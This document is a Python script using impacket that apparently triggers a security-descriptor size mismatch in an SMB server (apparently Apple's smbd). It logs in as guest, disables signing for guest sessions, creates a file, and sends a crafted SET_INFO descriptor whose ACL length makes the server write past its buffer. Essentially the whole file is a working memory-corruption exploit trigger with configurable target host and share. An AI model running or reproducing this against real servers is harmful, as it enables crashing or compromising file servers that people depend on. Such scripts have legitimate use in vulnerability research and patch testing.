#!/usr/bin/env python3
"""Exercise smbd's wire-to-native security descriptor size mismatch."""

import argparse
import struct
import time

from impacket.smb3 import SMB3
from impacket.smb3structs import (
    FILE_ATTRIBUTE_NORMAL,
    FILE_NON_DIRECTORY_FILE,
    FILE_OPEN_IF,
    FILE_SHARE_DELETE,
    FILE_SHARE_READ,
    FILE_SHARE_WRITE,
    GENERIC_ALL,
    SMB2_0_INFO_SECURITY,
)


def build_descriptor(size: int, alias_sacl: bool) -> bytes:
    if size < 0x20 or size > 0x10000 or size % 4:
        raise ValueError("size must be 4-byte aligned and between 0x20 and 0x10000")

    acl_size = size - 20
    if acl_size > 0xFFFF:
        raise ValueError("ACL size does not fit the wire u16 field")

    # SE_SELF_RELATIVE | SE_DACL_PRESENT, optionally SE_SACL_PRESENT.
    control = 0x8004 | (0x0010 if alias_sacl else 0)
    sacl_offset = 20 if alias_sacl else 0
    dacl_offset = 20
    descriptor = struct.pack(
        "<BBHIIII", 1, 0, control, 0, 0, sacl_offset, dacl_offset
    )

    # A valid empty ACL whose declared size spans the rest of the input. The
    # converter initializes that many destination bytes even though its caller
    # allocated only `size` bytes and the native descriptor starts at +40.
    acl = struct.pack("<BBHHH", 2, 0, acl_size, 0, 0)
    return descriptor + acl + bytes(size - len(descriptor) - len(acl))


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="192.168.64.81")
    parser.add_argument("--share", default="smbtest")
    parser.add_argument("--user", default="guest")
    parser.add_argument("--password", default="")
    parser.add_argument("--size", type=lambda value: int(value, 0), default=0x4000)
    parser.add_argument("--alias-sacl", action="store_true")
    args = parser.parse_args()

    blob = build_descriptor(args.size, args.alias_sacl)
    client = SMB3("*SMBSERVER", args.host, timeout=10)
    client.login(args.user, args.password)

    # Apple advertises signing-required but guest sessions have no signing key.
    # Stock clients send the post-login guest requests unsigned.
    if client.isGuestSession():
        client._Session["SigningActivated"] = False

    tree_id = client.connectTree(args.share)
    filename = f"codex_sd_overflow_{int(time.time())}.bin"
    file_id = client.create(
        tree_id,
        filename,
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE,
        FILE_OPEN_IF,
        FILE_ATTRIBUTE_NORMAL,
    )
    print(
        f"connected host={args.host} share={args.share} file={filename} "
        f"size={len(blob):#x} alias_sacl={args.alias_sacl}",
        flush=True,
    )

    try:
        client.setInfo(
            tree_id,
            file_id,
            blob,
            SMB2_0_INFO_SECURITY,
            0,
            0x4,  # DACL_SECURITY_INFORMATION
        )
        print("SET_INFO returned STATUS_SUCCESS", flush=True)
    except Exception as error:
        print(f"SET_INFO result: {type(error).__name__}: {error}", flush=True)

    try:
        client.close(tree_id, file_id)
    except Exception as error:
        print(f"close result: {type(error).__name__}: {error}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
